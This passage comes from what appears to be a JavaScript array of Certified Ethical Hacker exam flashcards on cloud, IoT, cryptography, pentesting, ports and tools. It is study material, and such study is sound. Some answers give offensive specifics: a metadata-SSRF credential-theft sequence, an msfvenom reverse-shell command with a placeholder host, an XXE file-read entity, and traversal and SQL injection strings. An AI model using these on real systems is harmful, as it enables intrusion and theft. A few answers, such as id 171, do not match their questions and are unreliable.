    a:"Shodan query: port:23 default password (or similar). Shodan indexes banners/responses; filtering by port and common default credential indicators finds thousands of exposed IoT devices. This is how Mirai found its targets." },
  { id:101, cat:"IoT / OT", diff:"M",
    q:"What tool is used to extract and analyse IoT firmware, and what does it look for?",
    a:"binwalk — extracts compressed filesystems, finds hidden files, identifies architecture. After extraction: firmwalker searches for passwords, API keys, private keys, hardcoded credentials, web servers. Ghidra/radare2 for binary reverse engineering." },
  { id:102, cat:"IoT / OT", diff:"H",
    q:"What is the difference between IT security and OT (Operational Technology) security priorities?",
    a:"IT: CIA triad with Confidentiality as primary. OT/ICS/SCADA: Availability is paramount (downtime = physical harm, production loss). Integrity second. Confidentiality third. Patching OT is difficult — systems run 24/7 and patches risk outages." },
  { id:103, cat:"IoT / OT", diff:"M",
    q:"What IoT protocol is commonly misconfigured and uses port 1883 without authentication?",
    a:"MQTT (Message Queuing Telemetry Transport) — pub/sub protocol for IoT. Default install has no authentication and no TLS. Port 1883 (cleartext), 8883 (TLS). Exposed brokers allow anyone to subscribe to all topics and read/publish data." },

  // ══ MODULE 19 — CLOUD ═════════════════════════════════════════════════
  { id:104, cat:"Cloud", diff:"M",
    q:"In IaaS, who is responsible for OS patching under the Shared Responsibility Model?",
    a:"The customer — in IaaS, CSP (Cloud Service Provider) is responsible for physical hardware, network, and hypervisor. The customer manages OS, runtime, middleware, application, and data. In PaaS: CSP also manages OS and runtime." },
  { id:105, cat:"Cloud", diff:"M",
    q:"What is cloud enumeration and what does Pacu do?",
    a:"Identifying cloud resources, IAM permissions, misconfigurations, and attack paths in AWS environments. Pacu is an open-source AWS exploitation framework — automates enumeration of IAM policies, EC2 instances, S3 buckets, Lambda functions, and privilege escalation paths." },
  { id:106, cat:"Cloud", diff:"H",
    q:"How does a cloud metadata SSRF attack work step by step?",
    a:"1. Find SSRF vulnerability (URL parameter passed to server-side fetch). 2. Inject: http://169.254.169.254/latest/meta-data/iam/security-credentials/ 3. Response lists IAM role name. 4. Fetch: /latest/meta-data/iam/security-credentials/[role-name] 5. Receive temporary AWS keys (AccessKeyId, SecretAccessKey, Token). 6. Use keys with AWS CLI to access all authorised resources." },
  { id:107, cat:"Cloud", diff:"M",
    q:"What is a misconfigured S3 bucket and what does 'public' access allow?",
    a:"An S3 bucket with public ACL or bucket policy allows any unauthenticated internet user to LIST (see all filenames) and GET (download) objects. Notable breaches: Capital One (100M records), Twitch source code, government databases. Fix: Block Public Access setting." },
  { id:108, cat:"Cloud", diff:"H",
    q:"What is a container escape attack and what common misconfiguration enables it?",
    a:"Breakout from a container (Docker) to the underlying host OS. Common vector: privileged containers (--privileged flag gives container full host kernel access), exposed Docker socket (/var/run/docker.sock mounted into container → can spawn privileged containers on host)." },

  // ══ MODULE 20 — CRYPTOGRAPHY ═════════════════════════════════════════
  { id:109, cat:"Cryptography", diff:"E",
    q:"In the 3DES encryption algorithm, how many keys are used and what is the block/key size?",
    a:"3 keys, each 56 bits (168 bits total, but effective security is 112 bits due to meet-in-the-middle). Block size: 64 bits. Three rounds of DES: Encrypt(K1) → Decrypt(K2) → Encrypt(K3). Being deprecated; use AES instead." },
  { id:110, cat:"Cryptography", diff:"M",
    q:"A company needs the best balance of security and performance for bulk data encryption with a quantum-aware future. Which algorithm?",
    a:"AES-256 — current gold standard for symmetric encryption. Hardware acceleration (AES-NI) makes it extremely fast. 256-bit key provides 128-bit post-quantum security (Grover's algorithm halves effective key strength). Better performance than 3DES." },
  { id:111, cat:"Cryptography", diff:"M",
    q:"What is the difference between a digital signature and a digital certificate?",
    a:"Digital signature: created with sender's private key to prove authenticity and integrity of a message. Digital certificate: issued by a CA, binds a public key to an identity (e.g., X.509 cert for HTTPS). Certificate contains the public key + identity + CA signature." },
  { id:112, cat:"Cryptography", diff:"H",
    q:"A CEH must recommend a cryptographic solution for key exchange over a public channel without transmitting the secret. Which algorithm?",
    a:"Diffie-Hellman (DH) or Elliptic Curve Diffie-Hellman (ECDH) — allows two parties to establish a shared secret over a public channel using modular exponentiation. The secret is never transmitted. Used in TLS, SSH, IPsec key exchange." },
  { id:113, cat:"Cryptography", diff:"M",
    q:"What is a birthday attack in cryptography?",
    a:"Exploits the birthday paradox: in a set of n elements, the probability of a hash collision is ~50% after √n hashes. Used to find two different inputs with the same hash (collision). MD5 is vulnerable to birthday attacks. SHA-256 has 2^128 collision resistance." },
  { id:114, cat:"Cryptography", diff:"E",
    q:"What is the difference between encryption and hashing?",
    a:"Encryption: two-way process — encrypted data can be decrypted with the correct key. Hashing: one-way — produces a fixed-size digest that cannot be reversed. Hashing is used for integrity verification and password storage. Encryption for confidentiality." },
  { id:115, cat:"Cryptography", diff:"M",
    q:"What makes bcrypt superior to MD5 for storing passwords?",
    a:"bcrypt is: 1) Adaptive (cost factor increases computation as hardware improves), 2) Slow-by-design (makes brute force impractical), 3) Automatically salted (each hash unique even for same password), 4) Has no hardware acceleration. MD5 is fast, unsalted, and GPU-crackable at billions/second." },

  // ══ MODULE 21 — PENETRATION TESTING ══════════════════════════════════
  { id:116, cat:"Pentest", diff:"M",
    q:"A CEH recommends a comprehensive security strategy after a data breach. Which strategy best represents defence-in-depth?",
    a:"Defence-in-Depth — multiple overlapping layers of security controls (perimeter, network, host, application, data). No single point of failure. If one layer is breached, others remain. Incorporates technical, administrative, and physical controls." },
  { id:117, cat:"Pentest", diff:"E",
    q:"What document MUST be signed before any penetration test begins, and what does it define?",
    a:"Rules of Engagement (RoE) — defines: scope (in-scope/out-of-scope targets), testing window, permitted techniques, emergency contacts, notification procedures, and legal authorisation. Without signed RoE, testing is potentially illegal." },
  { id:118, cat:"Pentest", diff:"M",
    q:"What is the difference between grey-box and white-box penetration testing?",
    a:"Grey-box: partial knowledge — credentials, internal IP ranges, high-level architecture. Simulates insider threat or post-phishing scenario. White-box (crystal box): full knowledge — source code, all credentials, complete architecture. Most thorough; used for code review + pentest." },
  { id:119, cat:"Pentest", diff:"H",
    q:"What is BloodHound used for in penetration testing?",
    a:"Active Directory attack path analysis — visualises relationships between users, groups, computers, and GPOs to identify paths to Domain Admin. Uses graph theory to find shortest paths. Collectors: SharpHound (Windows), BloodHound.py (Linux)." },
  { id:120, cat:"Pentest", diff:"M",
    q:"What is the PTES (Penetration Testing Execution Standard) phases?",
    a:"1. Pre-engagement interactions, 2. Intelligence gathering (recon), 3. Threat modelling, 4. Vulnerability analysis, 5. Exploitation, 6. Post-exploitation, 7. Reporting. Provides consistent, comprehensive testing methodology." },

  // ══ PORTS RAPID FIRE ══════════════════════════════════════════════════
  { id:121, cat:"Ports", diff:"E", q:"Port 20 and 21 — which does what?", a:"Port 21: FTP Control (commands, authentication). Port 20: FTP Data (actual file transfer in Active mode). Passive FTP uses a random high port for data instead of 20." },
  { id:122, cat:"Ports", diff:"E", q:"What service uses port 110 and what is its encrypted alternative?", a:"POP3 (Post Office Protocol v3) on port 110 — retrieves email, cleartext. Encrypted: POP3S on port 995 over TLS/SSL." },
  { id:123, cat:"Ports", diff:"E", q:"What service uses port 143 and what is its encrypted alternative?", a:"IMAP (Internet Message Access Protocol) on port 143 — retrieves and manages email on server, cleartext. Encrypted: IMAPS on port 993." },
  { id:124, cat:"Ports", diff:"M", q:"What service uses port 3306?", a:"MySQL — the default port for MySQL database server connections." },
  { id:125, cat:"Ports", diff:"M", q:"What service uses port 1433?", a:"Microsoft SQL Server (MSSQL) — default port for SQL Server database connections." },
  { id:126, cat:"Ports", diff:"M", q:"What service uses port 5432?", a:"PostgreSQL — default port for PostgreSQL database server." },
  { id:127, cat:"Ports", diff:"M", q:"What service uses port 6379?", a:"Redis — in-memory data structure store. Often exposed without authentication — common cloud misconfiguration." },
  { id:128, cat:"Ports", diff:"M", q:"What service uses ports 137-139 vs 445?", a:"137-139: NetBIOS (Name, Datagram, Session over TCP/IP). Port 445: SMB Direct (Server Message Block without NetBIOS). Modern Windows uses 445." },
  { id:129, cat:"Ports", diff:"M", q:"What service uses port 8443?", a:"HTTPS Alternate — common alternative HTTPS port, often used for admin interfaces and application servers (Tomcat, Jenkins). Also used for some VPN protocols." },
  { id:130, cat:"Ports", diff:"M", q:"What service uses port 2375 and why is it dangerous?", a:"Docker API (unencrypted) — exposed Docker daemon API. If reachable, attacker can create privileged containers, mount host filesystem, and achieve full host compromise. Should NEVER be exposed; use 2376 (TLS) if needed." },

  // ══ TOOLS DEEP DIVE ══════════════════════════════════════════════════
  { id:131, cat:"Tools", diff:"M",
    q:"What is the difference between Metasploit's exploit, payload, auxiliary, and post modules?",
    a:"Exploit: code that takes advantage of a vulnerability. Payload: code that runs on target after exploitation (shell, meterpreter). Auxiliary: supporting tasks — scanners, fuzzers, DoS (no payload). Post: post-exploitation — privilege escalation, persistence, pivoting." },
  { id:132, cat:"Tools", diff:"M",
    q:"What is a Meterpreter shell in Metasploit and why is it preferred over a regular shell?",
    a:"Meterpreter is an advanced payload that runs in memory (no disk footprint), communicates over encrypted channel, and provides rich functionality: file system access, process injection, webcam, keylogger, pivoting, token impersonation — all without dropping files." },
  { id:133, cat:"Tools", diff:"H",
    q:"What is the difference between a bind shell and a reverse shell?",
    a:"Bind shell: payload opens a listening port on the TARGET — attacker connects inbound. Blocked by egress firewalls on target. Reverse shell: TARGET connects OUT to attacker — bypasses most firewalls (outbound usually allowed). Reverse shells are far more common in real attacks." },
  { id:134, cat:"Tools", diff:"M",
    q:"What is Mimikatz used for and what Windows component does it attack?",
    a:"Mimikatz extracts plaintext passwords, NTLM hashes, Kerberos tickets from Windows memory (LSASS process). Enables Pass-the-Hash, Pass-the-Ticket, Golden/Silver Ticket attacks. Requires SYSTEM/admin privileges to dump LSASS." },
  { id:135, cat:"Tools", diff:"M",
    q:"What does the Nmap NSE script 'vuln' category do?",
    a:"Runs all vulnerability detection scripts — checks for known CVEs, misconfigurations, and exploitable conditions. Example: nmap --script vuln target. More targeted: nmap --script smb-vuln-ms17-010 target (EternalBlue/WannaCry check)." },

  // ══ COMPLIANCE / LAWS ════════════════════════════════════════════════
  { id:136, cat:"Compliance", diff:"M",
    q:"What does PCI-DSS stand for and what does it regulate?",
    a:"Payment Card Industry Data Security Standard — governs organisations that store, process, or transmit credit card data. 12 requirements covering network security, cardholder data protection, vulnerability management, access control, monitoring, and security policy." },
  { id:137, cat:"Compliance", diff:"M",
    q:"What is the legal basis for penetration testing and what protects the tester?",
    a:"Written authorisation (signed contract/RoE, Statement of Work, NDA). The Computer Fraud and Abuse Act (CFAA) in the US criminalises unauthorised access — written permission is the only legal protection. Verbal agreements are insufficient." },
  { id:138, cat:"Compliance", diff:"M",
    q:"What is GDPR and what does it require regarding data breaches?",
    a:"General Data Protection Regulation — EU law governing personal data. Key requirement: notify supervisory authority within 72 hours of discovering a personal data breach. Must also notify affected individuals if breach poses high risk. Fines up to €20M or 4% of global turnover." },
  { id:139, cat:"Compliance", diff:"E",
    q:"What is the HIPAA Security Rule?",
    a:"US regulation protecting electronic Protected Health Information (ePHI). Requires Administrative, Physical, and Technical safeguards. Breach notification required within 60 days. Applies to covered entities and business associates." },

  // ══ SCENARIO-BASED (EXAM-STYLE) ══════════════════════════════════════
  { id:140, cat:"Scenario", diff:"H",
    q:"A CEH notices IPID increments by 1 when probing target through zombie host. What does this mean?",
    a:"The port is CLOSED — when target receives a spoofed SYN from zombie IP and port is closed, target sends RST to zombie. Zombie's IPID only increments by 1 (the attacker's probe). IPID+2 = open (zombie got SYN-ACK, sent RST, incremented twice)." },
  { id:141, cat:"Scenario", diff:"H",
    q:"An attacker wants to use Hping3 for an ICMP ping scan, then Nmap SYN scan, then Metasploit. What is the correct tool order for a full attack?",
    a:"A — Use Hping3 for ICMP ping scan on subnet → Nmap SYN scan on live hosts → Metasploit for exploitation. This follows CEH methodology: host discovery → port/service scanning → exploitation." },
  { id:142, cat:"Scenario", diff:"M",
    q:"A CEH enhanced security with static ARP, IPv6, SSH, SFTP but sniffing attacks continue. What is still vulnerable?",
    a:"ARP spoofing on IPv6 uses NDP (Neighbour Discovery Protocol) — ICMPv6 Neighbour Advertisements can be spoofed similarly to ARP. IPv6 doesn't inherently solve layer 2 MITM. Requires IPv6 SEND (SEcure Neighbour Discovery) or DHCPv6 snooping." },
  { id:143, cat:"Scenario", diff:"H",
    q:"A CEH must recommend a strategy after an unidentified vulnerability led to breach. What is the BEST comprehensive defence?",
    a:"Defence-in-Depth (B) — multiple overlapping security layers. Risk management addresses known risks. Information Assurance covers CIA. But only Defence-in-Depth accounts for unknown vulnerabilities through layered controls that limit blast radius when one layer fails." },
  { id:144, cat:"Scenario", diff:"M",
    q:"An attacker John gains access, remains undetected for months, and exfiltrates sensitive data without sabotaging systems. What attack type is this?",
    a:"Advanced Persistent Threat (APT) — stealthy, targeted, prolonged. Objectives are typically espionage and data theft, not destruction. Characteristics: patient (months/years), uses custom malware, targets specific high-value organisations." },
  { id:145, cat:"Scenario", diff:"H",
    q:"A web server logs show: GET /../../../../etc/passwd HTTP/1.1 with a 200 response. What vulnerability is this?",
    a:"Directory Traversal (Path Traversal) — web server fails to restrict file access to the web root. The ../ sequences navigate up directories. Response 200 means the attack succeeded and /etc/passwd was returned. Fix: input validation, chroot jail, server-side path normalisation." },
  { id:146, cat:"Scenario", diff:"M",
    q:"A CEH intercepts traffic and sees plaintext 'USER admin' and 'PASS secret123' in packets. Which protocol is likely being used?",
    a:"FTP (port 21) — transmits credentials in cleartext. Also possible: Telnet (23), HTTP Basic Auth (80), POP3 (110). Confirmed by port number in capture. Countermeasure: SFTP (22), FTPS (990), HTTPS, SSH." },
  { id:147, cat:"Scenario", diff:"H",
    q:"An attacker captures a WPA2 handshake but cannot crack the password. What is the NEXT step?",
    a:"Use a more comprehensive wordlist or rule-based attack (Hashcat -r rules). Also consider: PMKID attack (doesn't require client), rainbow tables for common passwords, or deploy an Evil Twin to capture credentials directly. If WPS enabled: Reaver WPS PIN attack." },
  { id:148, cat:"Scenario", diff:"M",
    q:"A user receives an email from 'IT Support' asking them to call a number to verify their credentials. What attack is this?",
    a:"Vishing (voice phishing) setup — email is the lure; the actual attack occurs over phone. A form of hybrid social engineering: email establishes pretence of legitimacy, phone call extracts credentials." },
  { id:149, cat:"Scenario", diff:"H",
    q:"Database logs show: SELECT * FROM users WHERE id=1 AND SLEEP(5)--. What does this indicate?",
    a:"Time-based blind SQL injection — attacker is confirming SQLi vulnerability and/or extracting data using conditional time delays. The SLEEP(5) causes a 5-second delay if the condition evaluates. Indicates attacker has confirmed injection point and is probing." },
  { id:150, cat:"Scenario", diff:"M",
    q:"A CEH finds a web server returning 'Apache/2.4.49' in the Server response header. What is the immediate security concern?",
    a:"Apache 2.4.49 contains CVE-2021-41773 (path traversal + RCE). Revealing version information enables targeted exploitation of known CVEs. Fix: remove/obfuscate Server header, patch to latest version. Also check: X-Powered-By, X-Generator headers." },

  // ══ ADDITIONAL HIGH-FREQ EXAM TOPICS ════════════════════════════════
  { id:151, cat:"Foundations", diff:"M",
    q:"What is the difference between black-hat, white-hat, and grey-hat hackers?",
    a:"Black-hat: malicious intent, no authorisation — criminal. White-hat (ethical hacker): authorised testing to improve security. Grey-hat: hacks without authorisation but without malicious intent (may disclose vulnerabilities publicly without permission)." },
  { id:152, cat:"Foundations", diff:"E",
    q:"What is a zero-day vulnerability?",
    a:"A vulnerability that is unknown to the software vendor and has no patch available. Called 'zero-day' because the vendor has had zero days to fix it. Highly valuable in attack markets. Once disclosed and patched, it becomes a known vulnerability (N-day)." },
  { id:153, cat:"Scanning", diff:"M",
    q:"What Nmap timing template is considered paranoid (slowest) and which is insane (fastest)?",
    a:"T0 = Paranoid (slowest — 5 min between probes, avoids IDS). T5 = Insane (fastest — aggressive, very noisy). T3 = Normal (default). T4 is recommended for CTF/pentest. T0/T1 for stealth, T4/T5 for speed." },
  { id:154, cat:"Scanning", diff:"H",
    q:"What is a FIN scan and when does it NOT work?",
    a:"FIN scan sends packets with only the FIN flag. Open ports: no response (RFC 793). Closed ports: RST. Does NOT work on Windows — Windows sends RST for all unsolicited packets regardless of state, making all ports appear closed." },
  { id:155, cat:"System Hacking", diff:"M",
    q:"What is the Windows SAM database and how do attackers access it?",
    a:"Security Account Manager — stores hashed Windows user credentials. Located at C:\\Windows\\System32\\config\\SAM. Locked while Windows runs. Access methods: boot from live OS, Volume Shadow Copy (vssadmin), or use Mimikatz to dump from LSASS in memory." },
  { id:156, cat:"Malware", diff:"M",
    q:"What is the difference between a logic bomb and a time bomb?",
    a:"Logic bomb: triggers on a specific condition (deleted user account, file absent, action taken). Time bomb: variant of logic bomb — triggers at a specific date/time. Both are malicious code planted by insiders or malware, lying dormant until condition is met." },
  { id:157, cat:"Sniffing", diff:"H",
    q:"What is a VLAN hopping attack and which two techniques achieve it?",
    a:"VLAN hopping bypasses VLAN segmentation to access traffic on other VLANs. Two techniques: 1) Switch Spoofing — attacker negotiates 802.1Q trunk with switch (disable DTP). 2) Double Tagging — tag packet with two VLAN IDs; outer stripped by first switch, inner carries to target VLAN." },
  { id:158, cat:"Web Apps", diff:"M",
    q:"What is the difference between authentication and authorisation?",
    a:"Authentication: verifying IDENTITY — 'who are you?' (username/password, MFA, certificate). Authorisation: verifying PERMISSIONS — 'what are you allowed to do?' (RBAC, ACLs). CEH often tests broken authentication (M07) and broken access control (A01) as separate issues." },
  { id:159, cat:"Cryptography", diff:"M",
    q:"What is PKI and what are its components?",
    a:"Public Key Infrastructure — framework for managing digital certificates and public keys. Components: CA (Certificate Authority — issues/signs certs), RA (Registration Authority — verifies identity), CRL (Certificate Revocation List), OCSP (Online Certificate Status Protocol), End-Entity certificates." },
  { id:160, cat:"Pentest", diff:"M",
    q:"What is lateral movement in a penetration test?",
    a:"Moving from one compromised host to other systems on the same network. Techniques: Pass-the-Hash, Pass-the-Ticket, RDP, PsExec, WMI, SSH pivoting. Goal: expand access to reach high-value targets (domain controllers, databases) from initial foothold." },

  // ══ BONUS — ADVANCED / TRICKY ════════════════════════════════════════
  { id:161, cat:"Scanning", diff:"H",
    q:"What is OS fingerprinting and what two types exist?",
    a:"Active: send crafted packets and analyse responses (TCP ISN, window size, TTL, DF bit, options). Nmap -O. Passive: analyse existing traffic without sending packets — p0f tool. Passive is stealthier but requires traffic to be present." },
  { id:162, cat:"Enumeration", diff:"H",
    q:"What information can be extracted via SNMP with community string 'public'?",
    a:"ARP table, routing table, network interfaces, running processes, open TCP/UDP ports, installed software, system description (OS version, hostname), and often device configuration. Essentially a complete map of the device." },
  { id:163, cat:"System Hacking", diff:"H",
    q:"What is a Golden Ticket attack in Kerberos?",
    a:"Attacker compromises the KRBTGT account (Kerberos TGT signing key) and forges a TGT for any user, any group, indefinite validity. Provides persistent domain admin access. Requires DC compromise to get KRBTGT hash. Mitigated by resetting KRBTGT password twice." },
  { id:164, cat:"Wireless", diff:"H",
    q:"What is a PMKID attack and how does it differ from traditional WPA2 handshake capture?",
    a:"PMKID attack targets the RSN IE in beacon/probe response frames — doesn't require capturing a 4-way handshake (no client needed). PMKID = HMAC-SHA1(PMK, 'PMK Name', AP MAC, Client MAC). Attacker requests single frame from AP and cracks offline. Faster setup." },
  { id:165, cat:"Cloud", diff:"H",
    q:"What is an IAM privilege escalation attack in AWS?",
    a:"Attacker with limited IAM permissions uses misconfigurations to gain higher privileges: creating a new policy and attaching to self (iam:CreatePolicy + iam:AttachUserPolicy), assuming a more privileged role (sts:AssumeRole), or modifying an existing policy. Tool: Pacu's privesc module." },
  { id:166, cat:"Pentest", diff:"H",
    q:"What is pivoting and how is it achieved using Metasploit?",
    a:"Using a compromised host as a relay to attack internal networks not directly reachable. Metasploit: run 'route add [subnet] [session_id]' to route traffic through Meterpreter session. Also: portfwd command for port forwarding, SOCKS proxy (auxiliary/server/socks4a)." },
  { id:167, cat:"Compliance", diff:"M",
    q:"What is the difference between a security policy, standard, procedure, and guideline?",
    a:"Policy: high-level management directive (what). Standard: specific mandatory requirements (how much/what kind). Procedure: step-by-step implementation instructions (how). Guideline: recommended practices (not mandatory). Hierarchy: Policy → Standard → Procedure, Guidelines as advisory." },
  { id:168, cat:"Scenario", diff:"H",
    q:"A CEH discovers that all SQL queries use string concatenation: 'SELECT * FROM users WHERE user=' + input. What is the BEST fix?",
    a:"Replace with parameterised queries/prepared statements. The query structure is defined first with placeholders (?), then values are bound separately — database driver ensures values are treated as data, never code. Java: PreparedStatement; Python: cursor.execute(query, (param,))." },
  { id:169, cat:"Scenario", diff:"M",
    q:"An IDS generates many alerts but most are for legitimate traffic. What is this problem called?",
    a:"High false positive rate — anomaly-based IDS that hasn't been properly tuned to the environment's baseline generates excessive false alarms. Security fatigue causes analysts to ignore alerts. Fix: tune the baseline, use signature-based for known patterns, SIEM correlation." },
  { id:170, cat:"Tools", diff:"H",
    q:"What is the purpose of msfvenom in Metasploit?",
    a:"msfvenom combines msfpayload and msfencode — generates standalone malicious payloads in various formats (exe, elf, apk, ps1, php, etc.) with optional encoding to evade AV. Example: msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe > shell.exe" },
  { id:171, cat:"Foundations", diff:"M",
    q:"What are the three types of ethical hackers based on authorisation?",
    a:"White-box (crystal box): full info — source code, architecture, credentials. Grey-box: partial info — some credentials, network diagrams. Black-box: zero prior knowledge — simulates real-world external attacker. CEH also classifies by contract: internal (employee) vs external (consultant)." },
  { id:172, cat:"Footprinting", diff:"H",
    q:"What is an autonomous system (AS) and how does an attacker use it in footprinting?",
    a:"An AS is a collection of IP networks under a single administrative domain with a unique AS Number (ASN). Attackers use ASN lookups (whois -h whois.radb.net AS[number]) to identify all IP ranges owned by a target organisation — much broader than a single WHOIS lookup." },
  { id:173, cat:"SQLi", diff:"H",
    q:"What is Out-of-Band SQL injection?",
    a:"Exfiltrates data via a different channel than the HTTP response (DNS queries, HTTP requests). Used when in-band (error/union) is blocked and timing attacks are unreliable. MySQL: LOAD_FILE() / INTO OUTFILE with UNC paths; MSSQL: xp_dirtree for DNS exfil. Requires specific server permissions." },
  { id:174, cat:"Web Apps", diff:"H",
    q:"What is a clickjacking attack and what HTTP header prevents it?",
    a:"Clickjacking: embedding a target page in an invisible iframe to trick users into clicking on it (liking posts, changing settings, transferring funds). Prevention: X-Frame-Options: DENY/SAMEORIGIN header, or Content-Security-Policy: frame-ancestors 'none'." },
  { id:175, cat:"Compliance", diff:"M",
    q:"What is the Computer Fraud and Abuse Act (CFAA) and what does it prohibit?",
    a:"US federal law that criminalises unauthorised access to computer systems. Relevant to CEH: accessing any computer without authorisation or exceeding authorised access is a federal crime. Key defence for ethical hackers: written authorisation from the system owner." },
  { id:176, cat:"Sniffing", diff:"M",
    q:"What is a replay attack and how is it related to sniffing?",
    a:"Attacker captures valid network traffic (authentication tokens, session cookies, Kerberos tickets) via sniffing, then retransmits them later to gain unauthorised access. Defence: timestamps in authentication tokens, nonces (single-use values), sequence numbers." },
  { id:177, cat:"DoS / DDoS", diff:"H",
    q:"What is a DRDoS (Distributed Reflected DoS) attack?",
    a:"Uses third-party servers (DNS resolvers, NTP servers, SSDP devices) as amplifiers. Attacker spoofs victim's IP and sends small queries → large responses directed at victim. Reflects traffic through innocent third parties, making source IP tracing nearly impossible. DNS amplification is a common DRDoS." },
  { id:178, cat:"Mobile", diff:"H",
    q:"What is an Android intent attack?",
    a:"Android Intents are messages between app components (Activities, Services, BroadcastReceivers). Exported components that accept intents without permission checks can be invoked by any app. Attack: malicious app sends crafted intent to exported activity to: steal data, trigger privileged actions, or perform UI manipulation." },
  { id:179, cat:"IoT / OT", diff:"H",
    q:"What is a Modbus attack in OT/SCADA environments?",
    a:"Modbus is a serial communication protocol used in industrial equipment — no authentication, no encryption, no integrity checking. Attacker on the same network can: read any register (memory address), write to output coils (controlling physical devices — valves, pumps, motors), replay commands." },
  { id:180, cat:"Scenario", diff:"H",
    q:"A web app returns different error messages for valid vs invalid usernames during login. What vulnerability is this?",
    a:"Username enumeration — different responses for 'user not found' vs 'incorrect password' reveal valid accounts. Attackers build valid user lists for targeted brute force. Fix: return identical error messages regardless of whether username or password is wrong." },

  // ══ FINAL 20 — HIGH-VALUE EXAM PATTERNS ══════════════════════════════
  { id:181, cat:"Scanning", diff:"M", q:"What does nmap --script http-headers do?", a:"Retrieves HTTP response headers from a web server — reveals Server version, X-Powered-By, security headers (or absence of them), Set-Cookie flags, CORS settings. Used for web server fingerprinting and security header assessment." },
  { id:182, cat:"Enumeration", diff:"M", q:"What is RPC enumeration and what tool is used?", a:"RPC (Remote Procedure Call) enumeration identifies services registered with the portmapper (port 111). Tool: rpcinfo -p [target]. Reveals NFS shares, NIS maps, and other RPC services that can be further exploited." },
  { id:183, cat:"System Hacking", diff:"M", q:"What is DLL injection and when is it used?", a:"Injecting a malicious DLL into a running process to execute code in its context and privilege level. Used for privilege escalation, persistence, and AV evasion (code runs inside a trusted process). Tools: Metasploit's migrate command, manual CreateRemoteThread/LoadLibrary." },
  { id:184, cat:"Web Apps", diff:"M", q:"What is the difference between authentication bypass via SQL injection and a brute force attack?", a:"SQLi bypass: exploits a vulnerability in the query logic — works regardless of password complexity, no account lockout. Brute force: tries actual passwords — blocked by lockout policies, CAPTCHAs, rate limiting. SQLi bypass is far more reliable and instantaneous." },
  { id:185, cat:"Wireless", diff:"M", q:"What is wardriving and what tool is commonly used?", a:"Driving around with a wireless adapter in monitor mode to discover and map Wi-Fi access points. Tool: Kismet (passive detection, logs SSIDs/BSSIDs/channels/encryption). Also: inSSIDer, WiFiAnalyzer. Often used for identifying attack targets and rogue APs." },
  { id:186, cat:"Cryptography", diff:"H", q:"What is a man-in-the-middle attack against SSL/TLS and what certificate-based mechanism prevents it?", a:"MITM: attacker presents their own certificate to client and client's certificate to server, intercepting all traffic. Prevention: Certificate Pinning (app only accepts specific cert), HSTS (forces HTTPS, blocks downgrade), Certificate Transparency logs, DANE (DNSSEC-based cert validation)." },
  { id:187, cat:"Cloud", diff:"M", q:"What is a cloud access security broker (CASB) and what does it provide?", a:"Security policy enforcement point between cloud users and cloud services. Provides: visibility into cloud app usage, DLP (Data Loss Prevention), threat protection, compliance monitoring, and access control. Addresses shadow IT (unauthorised cloud use)." },
  { id:188, cat:"Tools", diff:"M", q:"What is Gobuster used for and give an example command?", a:"Directory and DNS brute-forcing. Finds hidden web directories/files and subdomains. Example: gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,html,txt. Also: gobuster dns -d target.com -w subdomains.txt" },
  { id:189, cat:"Pentest", diff:"H", q:"What is the OWASP Testing Guide (OTG) used for in web application penetration testing?", a:"A comprehensive methodology for testing web applications — provides standardised test cases for each OWASP Top 10 category and beyond. Covers testing information gathering, authentication, session management, input validation, error handling, cryptography. Used to ensure thorough and repeatable testing." },
  { id:190, cat:"Compliance", diff:"H", q:"What is the difference between a pentest scope and Rules of Engagement?", a:"Scope defines WHAT is tested (IP ranges, applications, physical, social engineering — in/out of scope targets). RoE defines HOW testing is conducted (timing, notification requirements, escalation procedures, emergency contacts, permitted/forbidden techniques). Both are required." },
  { id:191, cat:"Scenario", diff:"M", q:"An employee receives a USB drive in the mail labelled 'Salary Survey Results Q4'. They plug it in. What attack is this?", a:"Baiting — using physical media (USB) with enticing content to lure victims into executing malware. The USB likely runs AutoRun or exploits USB HID emulation (Rubber Ducky-style) to execute payload automatically on plug-in." },
  { id:192, cat:"Scenario", diff:"H", q:"A penetration tester obtains Domain Admin but the client says 'stop immediately, don't touch DC'. What should they do?", a:"Stop immediately and document the current state — the Rules of Engagement define what is permitted. Domain Controllers are often explicitly excluded or require separate written authorisation. Notify the emergency contact defined in RoE and await instructions. Document evidence without further exploitation." },
  { id:193, cat:"Foundations", diff:"M", q:"What is threat modelling and which framework does CEH v12 introduce?", a:"Threat modelling identifies potential threats and attack vectors before they are exploited. CEH v12 introduces the Diamond Model of Intrusion Analysis (Adversary, Capability, Infrastructure, Victim) alongside STRIDE (Spoofing, Tampering, Repudiation, Info Disclosure, DoS, Elevation of Privilege)." },
  { id:194, cat:"IoT / OT", diff:"M", q:"What is the Zigbee protocol and what security weakness does it have?", a:"Zigbee is a low-power, short-range wireless protocol for IoT (smart home, industrial sensors). Uses AES-128 encryption. Weakness: devices can be forced to use a default/insecure link key ('ZigBeeAlliance09') during joining phase — allows eavesdropping and replay attacks." },
  { id:195, cat:"Scanning", diff:"H", q:"What is a stateful firewall bypass using crafted TCP packets?", a:"Sending packets with only the ACK or RST flag set (no prior SYN). Stateful firewalls should block these (no matching connection state), but misconfigured firewalls may pass them. ACK scan (-sA) maps firewall rules: filtered=no response, unfiltered=RST." },
  { id:196, cat:"Web Apps", diff:"H", q:"What is XML External Entity (XXE) injection?", a:"Attackers inject malicious XML referencing external entities to: read local files (<!ENTITY xxe SYSTEM 'file:///etc/passwd'>), perform SSRF, or DoS. Exploits XML parsers that process external entity declarations. Fix: disable external entities in XML parser configuration." },
  { id:197, cat:"Cryptography", diff:"H", q:"What is a rainbow table and specifically what defeats it?", a:"Pre-computed hash chains mapping plaintext→hash for fast lookups. Trades storage for speed. What defeats it: salting — adding a unique random value to each password before hashing. Even if two users have the same password, their hashes will differ. Modern: bcrypt/scrypt/Argon2 include automatic salting." },
  { id:198, cat:"System Hacking", diff:"H", q:"What is a Kerberoasting attack?", a:"Attacker (any domain user) requests Kerberos service tickets (TGS) for service accounts (SPNs). Tickets are encrypted with service account's NTLM hash. Attacker extracts tickets offline and cracks them (Hashcat). Exploits service accounts with weak passwords. Tool: Rubeus, GetUserSPNs.py." },
